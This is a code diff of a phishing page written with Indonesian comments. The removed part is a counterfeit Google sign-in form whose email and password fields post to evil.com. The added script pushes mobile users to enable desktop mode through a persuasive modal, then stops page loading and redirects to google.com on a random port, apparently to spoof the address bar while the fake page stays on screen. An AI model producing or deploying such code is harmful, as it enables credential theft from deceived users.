@@ -1,138 +1,124 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sign in - Google Accounts</title>
-
-    <!-- FIXED: Script Tailwind harus tanpa escape -->
-    <script src="https://cdn.tailwindcss.com"></script>
-
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap" rel="stylesheet">
-
-    <style>
-        body {
-            font-family: 'Inter', sans-serif;
-            background-color: #f0f2f5;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            min-height: 100vh;
-            margin: 0;
-        }
-
-        .login-container {
-            background-color: #fff;
-            padding: 2.5rem;
-            border-radius: 8px;
-            box-shadow: 
-                0 1px 3px rgba(60, 64, 67, 0.3),
-                0 4px 8px rgba(60, 64, 67, 0.15);
-            width: 100%;
-            max-width: 400px;
-            text-align: center;
-            box-sizing: border-box;
-        }
-
-        .input-field {
-            width: 100%;
-            padding: 0.75rem 1rem;
-            margin-bottom: 1.25rem;
-            border: 1px solid #dadce0;
-            border-radius: 4px;
-            font-size: 1rem;
-            transition: .2s;
-        }
-        .input-field:focus {
-            outline: none;
-            border-color: #1a73e8;
-            box-shadow: 0 0 0 1px #1a73e8;
-        }
-
-        .btn-primary {
-            background-color: #1a73e8;
-            color: #fff;
-            padding: 0.75rem 1.5rem;
-            border-radius: 4px;
-            font-size: 1rem;
-            font-weight: 500;
-            cursor: pointer;
-            transition: .2s;
-            min-width: 90px;
-        }
-        .btn-primary:hover {
-            background-color: #1766d1;
-        }
-
-        .link-text {
-            color: #1a73e8;
-            font-weight: 500;
-            font-size: 0.875rem;
-        }
-        .link-text:hover {
-            text-decoration: underline;
-        }
-
-        .flex-between {
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-            margin-top: 1.5rem;
-        }
-    </style>
-</head>
-
-<body>
-    <div class="login-container">
-        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png"
-             alt="Google" class="mx-auto mb-6 w-24">
-
-        <h1 class="text-2xl font-normal mb-2">Sign in</h1>
-        <p class="text-base text-gray-600 mb-6">Use your Google Account</p>
-
-        <form id="loginForm" method="get" action="https://evil.com/">
-            <input type="email" id="email" name="email"
-                   class="input-field" placeholder="Email or phone" required>
-
-            <input type="password" id="password" name="pass"
-                   class="input-field" placeholder="Password" required>
-
-            <div class="text-left mb-6">
-                <a href="#" class="link-text">Forgot password?</a>
-            </div>
-
-            <p class="text-sm text-gray-600 text-left mb-6">
-                Not your computer? Use a private browsing window to sign in. 
-                <a href="#" class="link-text">Learn more</a>
-            </p>
-
-            <div class="flex-between">
-                <a href="#" class="link-text">Create account</a>
-                <button type="submit" class="btn-primary">Next</button>
-            </div>
-        </form>
-    </div>
-
-    <!-- FIXED: Script dipindah ke bawah -->
 <script>
 // Auto-prompt for desktop mode
-if (window.innerWidth < 1024) {
-    if (confirm("This site requires desktop mode for optimal experience. Switch to desktop view?")) {
-        // Guide user to browser menu
-        showDesktopModeInstructions();
-        function spoof() {
+if (window.innerWidth < 1024 && !sessionStorage.getItem('desktopPromptShown')) {
+    
+    // Tandai sudah menampilkan prompt agar tidak spam user
+    sessionStorage.setItem('desktopPromptShown', 'true');
+    
+    // Buat custom modal yang lebih persuasif
+    setTimeout(() => {
+        const modal = document.createElement('div');
+        modal.innerHTML = `
+            <div style="
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.7);
+                z-index: 999999;
+                display: flex;
+                justify-content: center;
+                align-items: center;
+                font-family: Arial, sans-serif;
+            ">
+                <div style="
+                    background: white;
+                    padding: 25px;
+                    border-radius: 10px;
+                    max-width: 400px;
+                    text-align: center;
+                    box-shadow: 0 10px 30px rgba(0,0,0,0.3);
+                ">
+                    <h3 style="color: #333; margin-bottom: 15px;">📱 Switch to Desktop View</h3>
+                    <p style="color: #666; margin-bottom: 20px; line-height: 1.5;">
+                        This website requires <strong>Desktop Mode</strong> for full functionality.
+                        Please tap the menu (⋮) and select <strong>"Open Desktop Site"</strong>.
+                    </p>
+                    <div style="margin: 20px 0; padding: 15px; background: #f5f5f5; border-radius: 5px; text-align: left;">
+                        <strong>Steps:</strong>
+                        <ol style="margin: 10px 0 0 0; padding-left: 20px;">
+                            <li>Tap the menu button (⋮) in your browser</li>
+                            <li>Check the <strong>"Desktop site"</strong> box</li>
+                            <li>Page will reload automatically</li>
+                        </ol>
+                    </div>
+                    <button id="gotItBtn" style="
+                        background: #4285f4;
+                        color: white;
+                        border: none;
+                        padding: 12px 30px;
+                        border-radius: 5px;
+                        font-size: 16px;
+                        cursor: pointer;
+                        font-weight: bold;
+                    ">
+                        Got it, show me the menu!
+                    </button>
+                </div>
+            </div>
+        `;
+        
+        document.body.appendChild(modal);
+        
+        // Tambah event listener untuk tombol
+        document.getElementById('gotItBtn').addEventListener('click', function() {
+            document.body.removeChild(modal);
+            
+            // Tunggu beberapa saat untuk user melakukan aksi
+            setTimeout(() => {
+                // Cek apakah user sudah mengaktifkan desktop mode
+                // Dengan mendeteksi perubahan viewport atau user agent
+                if (window.innerWidth >= 1024 || navigator.userAgent.includes('Windows')) {
+                    executeSpoof();
+                } else {
+                    // Jika belum, coba lagi dalam 2 detik
+                    checkDesktopMode();
+                }
+            }, 2000);
+        });
+        
+    }, 1500); // Tunggu 1.5 detik agar halaman selesai load
+    
+    function checkDesktopMode(attempts = 0) {
+        if (attempts >= 10) return; // Maks 10 percobaan
+        
         setTimeout(() => {
-            window.stop();
-            let randomPort;
-            do {
-                randomPort = Math.floor(Math.random() * 1000);
-            } while (randomPort === 0 || randomPort === 443);
-            document.location = "https://google.com:" + randomPort + "/";
-        }, 300);
+            // Deteksi desktop mode dengan beberapa metode
+            const isDesktopMode = 
+                window.innerWidth >= 1024 || 
+                /Windows|Macintosh|Linux/.test(navigator.userAgent) ||
+                !/Mobile|Android|iPhone/.test(navigator.userAgent);
+            
+            if (isDesktopMode) {
+                executeSpoof();
+            } else {
+                checkDesktopMode(attempts + 1);
+            }
+        }, 1000);
     }
-    spoof();
+    
+    function executeSpoof() {
+        // Tunggu sedikit lebih lama untuk memastikan render selesai
+        setTimeout(() => {
+            try {
+                // Hentikan loading
+                window.stop();
+                
+                // Generate random port
+                let randomPort;
+                do {
+                    randomPort = Math.floor(Math.random() * 10000) + 1000;
+                } while (randomPort === 443 || randomPort === 80);
+                
+                // Redirect dengan Google domain
+                document.location = "https://google.com:" + randomPort + "/";
+                
+            } catch (e) {
+                // Fallback jika window.stop() tidak bekerja
+                document.location = "https://google.com:8080/";
+            }
+        }, 500);
     }
 }
- </script>
-</body>
-</html>
+</script>
